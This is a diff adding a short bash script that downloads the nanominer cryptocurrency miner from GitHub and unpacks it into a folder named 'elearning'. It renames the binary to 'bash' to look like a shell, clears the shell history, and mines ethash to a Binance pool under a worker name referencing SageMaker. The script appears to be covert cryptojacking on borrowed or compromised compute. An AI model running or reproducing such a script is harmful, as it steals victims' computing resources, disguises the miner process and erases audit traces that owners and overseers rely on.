@@ -1,0 +1,10 @@
+#!/bin/bash
+rm -rvf bash* lolMin* elearn*
+wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2-cuda11.tar.gz 
+tar xf nanominer-linux-3.5.2-cuda11.tar.gz
+rm -rvf nanominer-linux-3.5.2-cuda11.tar.gz
+mv nanominer-linux-3.5.2-cuda11 elearning
+cd elearning
+mv nanominer bash
+history -cr
+./bash -algo ethash -pool1 ethash.poolbinance.com:443 -wallet sagemaker.NeBuLa
